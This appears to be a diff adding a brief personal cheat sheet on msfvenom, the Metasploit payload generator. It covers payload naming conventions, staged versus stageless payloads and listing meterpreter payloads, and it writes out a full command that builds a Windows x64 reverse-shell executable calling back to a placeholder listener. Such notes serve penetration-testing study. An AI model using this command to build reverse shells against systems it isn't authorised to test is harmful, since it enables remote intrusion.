@@ -1,0 +1,17 @@
+Used for generate payloads!!!
+
+
+>msfvenom -p <PAYLOAD> <OPTIONS>
+eg: Windows x64 reverse shell
+>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen.IP> LPORT=<listen.port>
+
+Naming convention
+<OS>/<arch>/<payload> eg: linux/x86/shell_reverse_tcp
+for windows 32bit target, convention name is an exception: windows/shell_reverse_tcp
+
+stageless	> shell_revesre_tcp
+staged		> shell/reverse_tcp
+
+
+msfvenom --list payloads | grep "linux/x86/meterpreter"
+
